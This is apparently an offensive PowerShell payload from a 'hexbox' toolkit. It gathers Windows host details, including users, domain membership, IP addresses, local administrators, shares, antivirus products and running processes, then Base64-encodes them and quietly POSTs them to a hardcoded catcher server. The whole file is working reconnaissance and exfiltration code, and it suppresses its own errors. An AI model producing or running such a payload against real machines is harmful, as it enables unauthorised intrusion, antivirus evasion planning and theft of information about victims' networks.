# ~/hexbox/payloads/sysinfo.ps1
# Collect Windows system info and POST JSON to HexBox catcher
param([string]$CatcherUrl = "http://10.0.0.99:8000/sysinfo")

function Get-IPAddresses {
    (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
     Where-Object { $_.IPAddress -notmatch '^127\.' } |
     Select-Object -ExpandProperty IPAddress) -join ", "
}

function Get-DomainInfo {
    try {
        $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
        return @{ Domain = $cs.Domain; PartOfDomain = $cs.PartOfDomain }
    } catch { return @{ Domain = "WORKGROUP"; PartOfDomain = $false } }
}

function Get-LocalAdmins {
    try {
        (net localgroup administrators 2>&1) -join "`n"
    } catch { "unavailable" }
}

function Get-NetworkShares {
    try {
        (net share 2>&1) -join "`n"
    } catch { "unavailable" }
}

function Get-AntivirusProducts {
    try {
        (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop |
         Select-Object -ExpandProperty displayName) -join ", "
    } catch { "unknown" }
}

$domInfo = Get-DomainInfo

$info = @{
    hostname         = $env:COMPUTERNAME
    username         = $env:USERNAME
    userdomain       = $env:USERDOMAIN
    domain           = $domInfo.Domain
    part_of_domain   = $domInfo.PartOfDomain
    os               = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
    architecture     = $env:PROCESSOR_ARCHITECTURE
    ip_addresses     = (Get-IPAddresses)
    local_admins     = (Get-LocalAdmins)
    shares           = (Get-NetworkShares)
    av_products      = (Get-AntivirusProducts)
    running_procs    = ((Get-Process -ErrorAction SilentlyContinue |
                         Where-Object { $_.Company } |
                         Sort-Object Name -Unique |
                         Select-Object -ExpandProperty Name) -join ", ")
    capture_time     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
}

$json = $info | ConvertTo-Json -Compress
$b64  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))

try {
    Invoke-WebRequest -Uri $CatcherUrl -Method POST `
        -Body @{ host = $env:COMPUTERNAME; data = $b64 } `
        -UseBasicParsing -TimeoutSec 15 | Out-Null
} catch {}
